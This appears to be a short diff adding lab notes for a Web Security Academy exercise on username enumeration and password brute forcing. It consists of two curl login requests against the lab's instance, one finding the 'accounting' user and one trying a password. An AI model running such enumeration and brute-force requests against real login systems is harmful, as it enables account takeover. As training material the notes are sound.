@@ -1,0 +1,15 @@
+
+
+First enum username and find that
+
+curl -ik -X $'POST' \
+    -b $'session=BOvbfEbukPVZ1z82vLuAn0HZBwRmei0l' \
+    --data-binary $'username=accounting&password=test' \
+    $'https://0aca005f0311d39680cc443b001d0011.web-security-academy.net/login'
+
+2nd test all password list
+
+curl -ik -X $'POST' \
+    -b $'session=BOvbfEbukPVZ1z82vLuAn0HZBwRmei0l' \
+    --data-binary $'username=accounting&password=monitor' \
+    $'https://0aca005f0311d39680cc443b001d0011.web-security-academy.net/login'
